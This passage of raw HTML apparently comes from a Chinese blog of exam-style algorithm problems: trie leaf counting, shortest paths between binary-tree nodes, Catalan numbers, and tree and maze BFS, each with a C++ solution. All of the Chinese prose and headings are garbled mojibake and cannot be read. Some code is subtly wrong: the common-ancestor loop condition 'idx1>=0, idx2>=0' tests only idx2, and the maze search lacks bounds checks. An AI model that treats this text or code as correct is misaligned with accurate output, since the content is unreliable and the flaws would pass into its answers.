class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; maxn; j++)&#123;</span><br><span class="line">q-&gt;next[j] = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">p-&gt;next[k] = q;</span><br><span class="line">p = p-&gt;next[k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">p-&gt;next[k]-&gt;ct++;</span><br><span class="line">p = p-&gt;next[k];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">countTree</span><span class="params">(Tree r)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">queue&lt;Tree&gt; q;</span><br><span class="line">q.<span class="built_in">push</span>(r);</span><br><span class="line"><span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">Tree p = q.<span class="built_in">front</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">int</span> tmp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; maxn; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(p-&gt;next[i] == <span class="literal">NULL</span>) tmp++;</span><br><span class="line"><span class="keyword">else</span> q.<span class="built_in">push</span>(p-&gt;next[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(tmp == maxn) sum++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">Tree root = <span class="keyword">new</span> node;</span><br><span class="line"><span class="built_in">initTree</span>(root);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">string s;</span><br><span class="line">cin &gt;&gt; s;</span><br><span class="line"><span class="built_in">buildTree</span>(root, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sum = <span class="built_in">countTree</span>(root);</span><br><span class="line">cout &lt;&lt; sum &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é¢˜çš„æ•°æ®é‡å¾ˆå°ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨mapæ¥æå®šï¼Œè®°å¾—æ¯æ¬¡å­˜é•¿åº¦æœ€å¤§çš„é‚£ä¸ª</p><h3 id="åŒ—é‚®2019-äºŒå‰æ ‘"><a href="#åŒ—é‚®2019-äºŒå‰æ ‘" class="headerlink" title="åŒ—é‚®2019 äºŒå‰æ ‘"></a>åŒ—é‚®2019 äºŒå‰æ ‘</h3><h5 id="é¢˜ç›®æè¿°-28"><a href="#é¢˜ç›®æè¿°-28" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>å¯¹äºŒå‰æ ‘ï¼Œè®¡ç®—ä»»æ„ä¸¤ä¸ªç»“ç‚¹çš„æœ€çŸ­è·¯å¾„é•¿åº¦ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-26"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-26" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-28"><a href="#è¾“å…¥æè¿°-28" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€è¡Œè¾“å…¥æµ‹è¯•æ•°æ®ç»„æ•° <span class="built_in">T</span></span><br><span class="line">ç¬¬äºŒè¡Œè¾“å…¥ <span class="built_in">n</span> , m ã€‚ <span class="built_in">n</span> ä»£è¡¨è¾“å…¥çš„æ•°æ®ç»„æ•°ï¼Œ m ä»£è¡¨è¦æŸ¥è¯¢çš„æ•°æ®ç»„æ•°ã€‚</span><br><span class="line">æ¥ä¸‹æ¥ <span class="built_in">n</span> è¡Œï¼Œæ¯è¡Œè¾“å…¥ä¸¤ä¸ªæ•°ï¼Œä»£è¡¨<span class="number">1</span>~ <span class="built_in">n</span> ç»“ç‚¹çš„å­©å­ç»“ç‚¹ï¼Œå¦‚æœæ²¡æœ‰å­©å­ç»“ç‚¹åˆ™è¾“å…¥-<span class="number">1</span>ï¼Œæ ¹èŠ‚ç‚¹ä¸º<span class="number">1</span>ã€‚</span><br><span class="line">æ¥ä¸‹æ¥ m è¡Œï¼Œæ¯è¡Œè¾“å…¥ä¸¤ä¸ªæ•°ï¼Œä»£è¡¨è¦æŸ¥è¯¢çš„ä¸¤ä¸ªç»“ç‚¹ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-28"><a href="#è¾“å‡ºæè¿°-28" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ¯ç»„æµ‹è¯•æ•°æ®è¾“å‡º m è¡Œï¼Œä»£è¡¨æŸ¥è¯¢çš„ä¸¤ä¸ªç»“ç‚¹ä¹‹é—´çš„æœ€çŸ­è·¯å¾„é•¿åº¦ã€‚</span><br></pre></td></tr></table></figure><p>æ‰¾æœ€å°å…¬å…±ç¥–å…ˆ</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">10000</span>;</span><br><span class="line"><span class="keyword">int</span> f[maxn];</span><br><span class="line"></span><br><span class="line"><span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">findminipath</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line"><span class="keyword">while</span>(f[a] != <span class="number">1</span>)&#123;</span><br><span class="line">res.<span class="built_in">push_back</span>(a);</span><br><span class="line">a = f[a];</span><br><span class="line">&#125;</span><br><span class="line">res.<span class="built_in">push_back</span>(a);</span><br><span class="line"><span class="keyword">if</span>(a != <span class="number">1</span>) res.<span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> t, n, m;</span><br><span class="line">cin &gt;&gt; t;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; i++)&#123;</span><br><span class="line">cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">f[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> l, r;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)&#123;</span><br><span class="line">cin &gt;&gt; l &gt;&gt; r;</span><br><span class="line"><span class="keyword">if</span>(l != <span class="number">-1</span>)&#123;</span><br><span class="line">f[l] = j+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(r != <span class="number">-1</span>)&#123;</span><br><span class="line">f[r] = j+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++)&#123;</span><br><span class="line">cin &gt;&gt; l &gt;&gt; r;</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt; lp = <span class="built_in">findminipath</span>(l);</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt; rp = <span class="built_in">findminipath</span>(r);</span><br><span class="line"><span class="keyword">int</span> idx1=lp.<span class="built_in">size</span>() - <span class="number">1</span>, idx2 = rp.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(;idx1&gt;=<span class="number">0</span>, idx2&gt;=<span class="number">0</span>; idx1--, idx2--)&#123;</span><br><span class="line"><span class="keyword">if</span>(lp[idx1] != rp[idx2])&#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; idx1+idx2+<span class="number">2</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="æœ‰å‘æ ‘å½¢æ€"><a href="#æœ‰å‘æ ‘å½¢æ€" class="headerlink" title="æœ‰å‘æ ‘å½¢æ€"></a>æœ‰å‘æ ‘å½¢æ€</h3><h5 id="é¢˜ç›®æè¿°-29"><a href="#é¢˜ç›®æè¿°-29" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>æ±‚Nä¸ªç»“ç‚¹èƒ½å¤Ÿç»„æˆçš„äºŒå‰æ ‘çš„ä¸ªæ•°ã€‚ 1&lt;=n&lt;=20</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-27"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-27" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-29"><a href="#è¾“å…¥æè¿°-29" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è§é¢˜ç›®</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-29"><a href="#è¾“å‡ºæè¿°-29" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è§é¢˜ç›®</span><br></pre></td></tr></table></figure><p>å¡ç‰¹å…°æ•°ï¼Œnè¾ƒå°ç›´æ¥é€’æ¨ï¼ŒåŠ ä¸Šè®°å¿†åŒ–æœç´¢</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> a[<span class="number">25</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line">a[<span class="number">0</span>] = <span class="number">1</span>, a[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; i; j++)&#123;</span><br><span class="line">ans += a[j] * a[i-j<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line">a[i] = ans;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; a[n] &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="å—äº¬ç†å·¥-æ ‘çš„é«˜åº¦"><a href="#å—äº¬ç†å·¥-æ ‘çš„é«˜åº¦" class="headerlink" title="å—äº¬ç†å·¥-æ ‘çš„é«˜åº¦"></a>å—äº¬ç†å·¥-æ ‘çš„é«˜åº¦</h3><h5 id="é¢˜ç›®æè¿°-30"><a href="#é¢˜ç›®æè¿°-30" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>æ ‘æ˜¯ä¸€ç§ç‰¹æ®Šçš„å›¾ç»“æ„ï¼Œæœ‰æ ¹æ ‘æ˜¯ä¸€ä¸ªæœ‰å›ºå®šæ ¹çš„æ ‘ã€‚ç°åœ¨ç»™å®šä¸€æ£µæœ‰æ ¹æ ‘ï¼Œç¼–ç¨‹æ±‚å‡ºæ ‘ä¸­æ‰€æœ‰èŠ‚ç‚¹åˆ°æŒ‡å®šçš„æ ¹èŠ‚ç‚¹æœ€è¿œè·ç¦»ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-28"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-28" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-30"><a href="#è¾“å…¥æè¿°-30" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€è¡Œæ˜¯ä¸¤ä¸ªæ•´æ•°<span class="built_in">N</span>ï¼ŒMï¼ˆ<span class="number">1</span>&lt;=<span class="built_in">N</span>&lt;=<span class="number">10000</span>,<span class="number">1</span>&lt;=M&lt;=<span class="built_in">N</span>ï¼‰ï¼Œè¡¨ç¤ºæ•°çš„é¡¶ç‚¹æ•°å’Œæ ¹èŠ‚ç‚¹çš„ç¼–å·ï¼Œæ¥ä¸‹æ¥<span class="built_in">N</span>-<span class="number">1</span>è¡Œï¼Œæ¯è¡Œä¸¤ä¸ªæ•´æ•°u,vï¼ˆ<span class="number">1</span>&lt;=u,v&lt;=<span class="built_in">N</span>ï¼‰ï¼Œè¡¨ç¤ºç¼–å·ä¸ºuçš„èŠ‚ç‚¹å’Œç¼–å·ä¸ºvçš„èŠ‚ç‚¹é—´æœ‰ä¸€æ¡è¾¹ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-30"><a href="#è¾“å‡ºæè¿°-30" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å‡ºè·ç¦»æ ¹èŠ‚ç‚¹æœ€è¿œçš„ç‚¹åˆ°æ ¹çš„è·ç¦»ã€‚</span><br></pre></td></tr></table></figure><p>BFSç®—æ³•</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;edge;</span><br><span class="line"><span class="keyword">int</span> deep;</span><br><span class="line"><span class="keyword">bool</span> visit;</span><br><span class="line"></span><br><span class="line"><span class="built_in">node</span>()&#123;</span><br><span class="line">deep = <span class="number">0</span>;</span><br><span class="line">visit = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line">cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">node nod[<span class="number">10000</span>];</span><br><span class="line">queue&lt;<span class="keyword">int</span>&gt; q;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> u, v;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; i++)&#123;</span><br><span class="line">cin &gt;&gt; u &gt;&gt; v;</span><br><span class="line">nod[u].edge.<span class="built_in">push_back</span>(v);</span><br><span class="line">nod[v].edge.<span class="built_in">push_back</span>(u);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> max = <span class="number">1</span>;</span><br><span class="line">nod[m].deep = <span class="number">1</span>;</span><br><span class="line">nod[m].visit = <span class="literal">true</span>;</span><br><span class="line">q.<span class="built_in">push</span>(m);</span><br><span class="line"><span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line"><span class="keyword">int</span> now = q.<span class="built_in">front</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nod[now].edge.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!nod[nod[now].edge[i]].visit)&#123;</span><br><span class="line">nod[nod[now].edge[i]].visit = <span class="literal">true</span>;</span><br><span class="line">nod[nod[now].edge[i]].deep = nod[now].deep + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(max &lt; nod[nod[now].edge[i]].deep) max = nod[nod[now].edge[i]].deep;</span><br><span class="line">q.<span class="built_in">push</span>(nod[now].edge[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; max - <span class="number">1</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h1 id="æœç´¢"><a href="#æœç´¢" class="headerlink" title="æœç´¢"></a>æœç´¢</h1><h3 id="è¿·å®«"><a href="#è¿·å®«" class="headerlink" title="è¿·å®«"></a>è¿·å®«</h3><h5 id="é¢˜ç›®æè¿°-31"><a href="#é¢˜ç›®æè¿°-31" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>Time Limit: 1000 ms<br>Memory Limit: 256 mb</p><p>å° A åŒå­¦ç°åœ¨è¢«å›°åœ¨äº†ä¸€ä¸ªè¿·å®«é‡Œé¢ï¼Œä»–å¾ˆæƒ³ä»è¿·å®«ä¸­èµ°å‡ºæ¥ï¼Œä»–å¯ä»¥ å‘ä¸Šã€å‘ä¸‹ã€å‘å·¦ã€å‘å³ç§»åŠ¨ã€æ¯ç§»åŠ¨ä¸€æ ¼éƒ½éœ€è¦èŠ±è´¹ 1 ç§’çš„æ—¶é—´ï¼Œä¸èƒ½å¤Ÿèµ°åˆ° è¾¹ç•Œä¹‹å¤–ã€‚å‡è®¾å° A ç°åœ¨çš„ä½ç½®åœ¨ Sï¼Œè¿·å®«çš„å‡ºå£åœ¨ Eï¼Œè¿·å®«å¯èƒ½æœ‰å¤šä¸ªå‡ºå£ã€‚ é—®å° A æƒ³è¦èµ°åˆ°è¿·å®«å‡ºå£æœ€å°‘éœ€è¦èŠ±è´¹å¤šå°‘ç§’ï¼Ÿ</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-29"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-29" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-31"><a href="#è¾“å…¥æè¿°-31" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">æœ‰å¤šç»„æµ‹è¯•æ•°æ®ã€‚</span><br><span class="line">ç¬¬ä¸€è¡Œè¾“å…¥ä¸¤ä¸ªæ­£æ•´æ•° <span class="built_in">H</span>ï¼ˆ<span class="number">0</span> &lt; <span class="built_in">H</span> &lt;= <span class="number">100</span>ï¼‰å’Œ Wï¼ˆ<span class="number">0</span> &lt; W &lt;= <span class="number">100</span>ï¼‰ï¼Œåˆ†åˆ«è¡¨ç¤ºè¿·</span><br><span class="line">å®«çš„é«˜å’Œå®½ã€‚</span><br><span class="line">æ¥ä¸‹æ¥ <span class="built_in">H</span> è¡Œï¼Œæ¯è¡Œ W ä¸ªå­—ç¬¦ï¼ˆå…¶ä¸­â€˜*â€™è¡¨ç¤ºè·¯ï¼Œâ€˜<span class="comment">#â€™è¡¨ç¤ºå¢™ï¼Œâ€˜Sâ€™è¡¨ç¤ºå° A</span></span><br><span class="line">çš„ä½ç½®ï¼Œâ€˜Eâ€™è¡¨ç¤ºè¿·å®«å‡ºå£ï¼‰ã€‚</span><br><span class="line">å½“ <span class="built_in">H</span> ä¸ W éƒ½ç­‰äº <span class="number">0</span> æ—¶ç¨‹åºç»“æŸã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-31"><a href="#è¾“å‡ºæè¿°-31" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å‡ºå° <span class="selector-tag">A</span> èµ°åˆ°è¿·å®«å‡ºå£æœ€å°‘éœ€è¦èŠ±è´¹å¤šå°‘ç§’ï¼Œå¦‚æœæ°¸è¿œæ— æ³•èµ°åˆ°å‡ºå£åˆ™è¾“å‡ºâ€œ-<span class="number">1</span>â€ã€‚</span><br></pre></td></tr></table></figure><p>BFSï¼Œæ³¨æ„structçš„åˆå§‹åŒ–</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">105</span>;</span><br><span class="line"><span class="keyword">char</span> m[maxn][maxn];</span><br><span class="line"><span class="keyword">int</span> vis[maxn][maxn];</span><br><span class="line"><span class="keyword">int</span> dir[<span class="number">4</span>][<span class="number">2</span>] = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">-1</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> x, y;</span><br><span class="line"><span class="keyword">int</span> step;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bfs</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="built_in">memset</span>(vis, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(vis));</span><br><span class="line">queue&lt;node&gt; q;</span><br><span class="line">node s = &#123;x, y, <span class="number">0</span>&#125;;</span><br><span class="line">q.<span class="built_in">push</span>(s);</span><br><span class="line">vis[x][y] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">node now = q.<span class="built_in">front</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">if</span>(m[now.x][now.y] == <span class="string">&#x27;E&#x27;</span>)&#123;</span><br><span class="line">ans = now.step;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> nx = now.x + dir[i][<span class="number">0</span>];</span><br><span class="line"><span class="keyword">int</span> ny = now.y + dir[i][<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>((m[nx][ny]==<span class="string">&#x27;*&#x27;</span>||m[nx][ny]==<span class="string">&#x27;E&#x27;</span>) &amp;&amp; vis[nx][ny]==<span class="number">0</span>)&#123;</span><br><span class="line">node tmp = &#123;nx, ny, now.step+<span class="number">1</span>&#125;;</span><br><span class="line">q.<span class="built_in">push</span>(tmp);</span><br><span class="line">vis[nx][ny] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span 